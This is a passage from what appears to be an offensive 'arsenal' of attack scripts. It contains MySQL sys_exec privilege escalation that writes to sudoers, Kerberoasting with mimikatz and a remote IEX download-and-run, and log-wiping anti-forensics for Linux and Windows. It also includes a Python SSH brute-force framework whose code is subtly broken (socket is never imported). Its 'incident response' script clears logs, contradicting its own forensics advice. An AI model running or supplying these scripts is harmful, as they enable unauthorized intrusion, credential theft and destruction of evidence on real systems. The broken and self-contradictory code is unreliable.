SELECT sys_exec('id');
SELECT sys_eval('whoami');

-- Add user to sudoers
SELECT sys_exec('echo "mysql ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');
```

---

## Active Directory & Domain Scripts

### Domain Enumeration

**PowerShell AD Enumeration**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Domain information
Get-ADDomain
Get-ADForest

# Domain controllers
Get-ADDomainController -Filter *

# Users enumeration
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet

# Groups enumeration
Get-ADGroup -Filter * | Select-Object Name, GroupScope, GroupCategory
Get-ADGroupMember -Identity "Domain Admins"

# Computers enumeration
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem, LastLogonDate

# Service Principal Names (SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Bloodhound Collection**
```powershell
# SharpHound data collection
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Alternative: PowerShell version
Import-Module .\BloodHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
```

### Kerberoasting

**PowerShell Kerberoasting**
```powershell
# Request service tickets for accounts with SPNs
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/web.domain.com'

# Extract tickets from memory
mimikatz.exe "kerberos::list /export"

# Or use PowerShell Empire's Invoke-Kerberoast
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat
```

---

## Stealth & Anti-Forensics

### Log Cleaning Scripts

**Linux Log Cleaning**
```bash
#!/bin/bash
# Clean various Linux logs

echo "[+] Cleaning system logs..."

# Clear auth logs
> /var/log/auth.log
> /var/log/secure

# Clear system logs
> /var/log/syslog
> /var/log/messages

# Clear Apache logs
> /var/log/apache2/access.log
> /var/log/apache2/error.log

# Clear command history
history -c
history -w
unset HISTFILE
> ~/.bash_history

# Clear last login records
> /var/log/lastlog
> /var/log/wtmp
> /var/log/utmp

echo "[+] Log cleaning completed"
```

**Windows Event Log Cleaning**
```powershell
# Clear Windows Event Logs
wevtutil cl System
wevtutil cl Application
wevtutil cl Security
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Or use PowerShell
Get-EventLog -List | ForEach-Object {Clear-EventLog $_.Log}
```

### Anti-Forensics Techniques

**Secure File Deletion**
```bash
# Shred files securely
shred -vzfn 10 /path/to/sensitive/file

# Wipe free space
dd if=/dev/zero of=/tmp/zero bs=1M
rm /tmp/zero

# Clear swap
swapoff -a
swapon -a
```

**Memory Dumping Prevention**
```bash
# Disable core dumps
ulimit -c 0
echo "* hard core 0" >> /etc/security/limits.conf

# Clear shared memory
ipcs -m | awk '/^0x/ {print $2}' | xargs -n1 ipcrm -m
```

---

## Automation & Frameworks

### Automated Exploitation Framework

**Python Exploitation Framework**
```python
#!/usr/bin/env python3
import subprocess
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor

class ExploitFramework:
    def __init__(self):
        self.targets = []
        self.results = {}
        
    def add_target(self, ip, ports=None):
        self.targets.append({'ip': ip, 'ports': ports or [22, 80, 443, 3389]})
        
    def port_scan(self, target):
        """Quick port scan"""
        open_ports = []
        for port in target['ports']:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target['ip'], port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
        
    def web_check(self, ip, port):
        """Check for web services"""
        try:
            url = f"http://{ip}:{port}"
            response = requests.get(url, timeout=5)
            return {
                'status_code': response.status_code,
                'title': self.extract_title(response.text),
                'server': response.headers.get('Server', 'Unknown')
            }
        except:
            return None
            
    def extract_title(self, html):
        """Extract title from HTML"""
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else "No title"
        
    def ssh_bruteforce(self, ip, usernames, passwords):
        """Basic SSH brute force"""
        import paramiko
        for username in usernames:
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=3)
                    ssh.close()
                    return (username, password)
                except:
                    continue
        return None
        
    def run_exploits(self):
        """Main exploitation routine"""
        print("[+] Starting automated exploitation...")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            for target in self.targets:
                # Port scan
                ports = self.port_scan(target)
                target['open_ports'] = ports
                
                # Web enumeration
                for port in [80, 443, 8080, 8443]:
                    if port in ports:
                        web_info = self.web_check(target['ip'], port)
                        if web_info:
                            target[f'web_{port}'] = web_info
                
                # SSH brute force
                if 22 in ports:
                    creds = self.ssh_bruteforce(target['ip'],
                                              ['admin', 'root', 'user'],
                                              ['admin', 'password', '123456'])
                    if creds:
                        target['ssh_creds'] = creds
                        
        self.generate_report()
        
    def generate_report(self):
        """Generate exploitation report"""
        print("\n[+] Exploitation Report")
        print("=" * 50)
        
        for target in self.targets:
            print(f"\nTarget: {target['ip']}")
            print(f"Open Ports: {target.get('open_ports', [])}")
            
            for key, value in target.items():
                if key.startswith('web_'):
                    print(f"Web Service ({key}): {value}")
                elif key == 'ssh_creds':
                    print(f"SSH Credentials: {value[0]}:{value[1]}")

# Usage example
if __name__ == "__main__":
    framework = ExploitFramework()
    framework.add_target("192.168.1.100")
    framework.add_target("192.168.1.101")
    framework.run_exploits()
```

---

## Emergency Response Scripts

### Incident Response

**Immediate Response Script**
```bash
#!/bin/bash
# Emergency incident response script

echo "[!] EMERGENCY RESPONSE ACTIVATED"
echo "================================="

# Kill all suspicious processes
pkill -f nc
pkill -f ncat
pkill -f socat
pkill -f python
pkill -f bash.*tcp

# Remove uploaded files
find /tmp -name "*shell*" -delete
find /var/www -name "*shell*" -delete
find /dev/shm -name "*hack*" -delete

# Block suspicious IPs (replace with actual attacker IPs)
iptables -A INPUT -s ATTACKER_IP -j DROP
iptables -A OUTPUT -d ATTACKER_IP -j DROP

# Clear logs
> /var/log/auth.log
> /var/log/apache2/access.log

# Reset passwords
passwd root
passwd admin

echo "[+] Emergency response completed"
echo "[+] System should be temporarily secured"
echo "[!] CONDUCT FULL FORENSIC ANALYSIS IMMEDIATELY"
```

**Evidence Collection Script**
```bash
#!/bin/bash
# Digital forensics evidence collection

CASE_DIR="/tmp/evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$CASE_DIR"

echo "[+] Collecting digital evidence to: $CASE_DIR"

# System information
uname -a > "$CASE_DIR/system_info.txt"
date >> "$CASE_DIR/system_info.txt"
uptime >> "$CASE_DIR/system_info.txt"

# Network connections
netstat -antup > "$CASE_DIR/network_connections.txt"
ss -antup >> "$CASE_DIR/network_connections.txt"

# Process list
ps aux > "$CASE_DIR/processes.txt"
pstree >> "$CASE_DIR/processes.txt"

# Open files
lsof > "$CASE_DIR/open_files.txt"

# Log files
cp -r /var/log "$CASE_DIR/"

# Command history
cp ~/.bash_history "$CASE_DIR/"

# Create hash manifest
find "$CASE_DIR" -type f -exec md5sum {} \; > "$CASE_DIR/evidence_hashes.txt"

echo "[+] Evidence collection completed"
echo "[+] Evidence stored in: $CASE_DIR"
```

---

## Script Usage Guidelines

### Security Considerations

1. **Test in Controlled Environments**: Always test scripts in lab environments before using in production
2. **Understand Legal Implications**: Ensure proper authorization before running any exploitation scripts
3. **Clean Up**: Always clean up after testing to avoid leaving artifacts
4. **Documentation**: Document all script usage and modifications
5. **Version Control**: Keep scripts updated and maintain version history

### Best Practices

1. **Parameterization**: Use command-line arguments for flexible script usage
2. **Error Handling**: Implement proper error handling and logging
3. **Stealth**: Consider detectability and implement evasion techniques
4. **Efficiency**: Optimize scripts for speed and resource usage
5. **Modularity**: Create reusable modules and functions

---

**⚠️ OPERATIONAL SECURITY WARNING ⚠️**

These scripts are powerful tools that can cause significant damage if misused. Always ensure:

- Proper authorization before use
- Controlled environment testing
- Understanding of script functionality
- Proper cleanup procedures
- Legal compliance at all times

**Use responsibly. Test thoroughly. Document everything.**

---
*End of Tactical Scripts & Automation Arsenal v2.0*

